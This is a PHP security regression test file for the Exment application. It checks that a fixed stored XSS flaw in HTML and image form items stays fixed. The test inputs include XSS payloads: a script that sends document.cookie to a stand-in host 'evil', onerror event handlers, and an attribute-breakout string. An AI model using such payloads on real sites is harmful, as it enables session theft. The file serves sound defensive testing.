<?php

namespace Exceedone\Exment\Tests\Unit\Security;

use ReflectionMethod;
use Exceedone\Exment\ColumnItems\FormOthers\Html;
use Exceedone\Exment\ColumnItems\FormOthers\ExHtml;
use Exceedone\Exment\ColumnItems\FormOthers\Image;

/**
 * JVN #05318392 (FIXED): Stored XSS in the "HTML" form-other item.
 *
 * The vulnerability: Html::_html() overrode the base FormOtherItem::_html() and
 * returned array_get($form_column_options, 'html') RAW:
 *     public function _html($v) { return $this->_text($v); }   // no html_clean
 * FormOtherItem::setShowFieldOptions() renders that return value with
 * ->setEscape(false), so a <script>/onerror payload stored by a custom-form
 * editor executed in every viewer's session (stored XSS).
 *
 * ExHtml extends Html and does NOT override _html(), so it inherited the same
 * raw sink AND additionally interpolates record values into the template
 * (replaceTextFromFormat) — strictly worse.
 *
 * Image::_html() built '<img src="'.$url.'"...>' with $url unescaped (attribute
 * injection sink). Hardened by escaping the attribute.
 *
 * The fix:
 *   Html::_html()  -> return html_clean($this->_text($v));  (HTMLPurifier whitelist)
 *   Image::_html() -> '<img src="'.esc_html($url).'"...>'
 *
 * BEFORE FIX: _html() output contains the raw <script>/onerror payload.
 * AFTER FIX:  the payload is stripped/escaped, legitimate formatting is kept.
 */
class JvnColumnItemXssFixedTest extends SecurityRegressionTestCase
{
    /** Invoke a protected _html($v) on a column item with the given options. */
    private function renderHtml(object $item, array $options, $value = null): string
    {
        $item->setFormColumnOptions($options);

        $method = new ReflectionMethod($item, '_html');
        $method->setAccessible(true);

        return (string) $method->invoke($item, $value);
    }

    // -----------------------------------------------------------------------
    // JVN #05318392 — Html item
    // -----------------------------------------------------------------------

    public function test_html_item_strips_script_payload(): void
    {
        $payload = '<script>document.location="//evil/?c="+document.cookie</script>';

        $out = $this->renderHtml(new Html(null), ['html' => $payload]);

        $this->assertStringNotContainsString('<script', $out, 'html_clean must strip <script> (JVN #05318392).');
        $this->assertStringNotContainsString('document.cookie', $out, 'The script body must not survive.');
    }

    public function test_html_item_strips_event_handler_payload(): void
    {
        $payload = '<img src=x onerror="alert(document.domain)">';

        $out = $this->renderHtml(new Html(null), ['html' => $payload]);

        $this->assertStringNotContainsString('onerror', $out, 'html_clean must strip on* event handlers.');
    }

    public function test_html_item_preserves_legitimate_formatting(): void
    {
        // The HTML item exists to render rich formatting: it must still work after the fix.
        $out = $this->renderHtml(new Html(null), ['html' => '<b>bold</b> and <a href="https://example.com">link</a>']);

        $this->assertStringContainsString('bold', $out, 'Legitimate text must be preserved.');
        $this->assertStringContainsString('<b>', $out, 'Whitelisted <b> formatting must be preserved.');
        $this->assertStringContainsString('https://example.com', $out, 'Whitelisted links must be preserved.');
    }

    public function test_html_item_preserves_table_markup(): void
    {
        // Regression guard for the widened html_clean allow-list (Define::HTML_ALLOWED_DEFAULT):
        // safe structural markup such as tables must survive, so the XSS hardening does not silently
        // strip legitimate rich content. A <script> inside must still be removed.
        $payload = '<table><thead><tr><th>H</th></tr></thead><tbody><tr><td>cell<script>alert(1)</script></td></tr></tbody></table>';

        $out = $this->renderHtml(new Html(null), ['html' => $payload]);

        $this->assertStringContainsString('<table', $out, 'Table markup must be preserved by html_clean().');
        $this->assertStringContainsString('<td', $out, 'Table cells must be preserved.');
        $this->assertStringContainsString('cell', $out, 'Table text content must be preserved.');
        $this->assertStringNotContainsString('<script', $out, 'Script inside a table must still be stripped.');
    }

    public function test_html_item_source_uses_html_clean(): void
    {
        $src = $this->exmentSource('ColumnItems/FormOthers/Html.php');

        $this->assertMatchesRegularExpression(
            '/function\s+_html\([^)]*\)\s*\{[^}]*html_clean\s*\(/s',
            $src,
            'Html::_html() must sanitize via html_clean().'
        );
        $this->assertDoesNotMatchRegularExpression(
            '/function\s+_html\([^)]*\)\s*\{\s*(\/\/[^\n]*\n\s*)?return\s+\$this->_text\(\$v\);\s*\}/s',
            $src,
            'The raw "return $this->_text($v);" sink (old XSS shape) must be gone.'
        );
    }

    // -----------------------------------------------------------------------
    // ExHtml item — inherits the sanitized _html()
    // -----------------------------------------------------------------------

    public function test_exhtml_does_not_reintroduce_raw_html_override(): void
    {
        // ExHtml must inherit Html::_html() (now sanitized). A local _html() override
        // that returns _text() raw would re-open the hole, so guard against it.
        $src = $this->exmentSource('ColumnItems/FormOthers/ExHtml.php');

        $this->assertStringNotContainsString(
            'function _html',
            $src,
            'ExHtml must inherit the sanitized Html::_html(); it must not override _html().'
        );

        // Confirm at the class level that ExHtml resolves _html() to Html's implementation.
        $declaring = (new ReflectionMethod(ExHtml::class, '_html'))->getDeclaringClass()->getName();
        $this->assertSame(
            Html::class,
            $declaring,
            'ExHtml::_html() must resolve to the sanitized Html::_html().'
        );
    }

    // -----------------------------------------------------------------------
    // Image item — attribute-injection hardening
    // -----------------------------------------------------------------------

    public function test_image_url_attribute_is_escaped(): void
    {
        // A hostile image_url that tries to break out of the src="" attribute.
        $out = $this->renderHtml(new Image(null), ['image_url' => 'x" onerror="alert(1)']);

        $this->assertStringNotContainsString('onerror="alert', $out, 'The " must be escaped so no new attribute is injected.');
        $this->assertStringContainsString('&quot;', $out, 'The double quote must be HTML-entity encoded.');
    }

    public function test_image_source_escapes_url(): void
    {
        $src = $this->exmentSource('ColumnItems/FormOthers/Image.php');

        $this->assertStringContainsString(
            "esc_html(\$url)",
            $src,
            'Image::_html() must escape $url inside the <img src> attribute.'
        );
    }
}
